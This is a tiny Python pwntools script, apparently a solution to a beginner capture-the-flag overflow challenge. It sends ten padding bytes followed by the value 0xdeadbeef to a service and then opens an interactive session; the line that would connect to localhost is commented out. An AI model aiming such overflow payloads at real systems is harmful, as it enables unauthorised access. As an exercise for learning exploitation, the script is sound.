from pwn import *

#p = remote("localhost", 4445)

p.recvline()

p.sendline(b"aaaaaaaaaa\xef\xbe\xad\xde")

p.interactive()


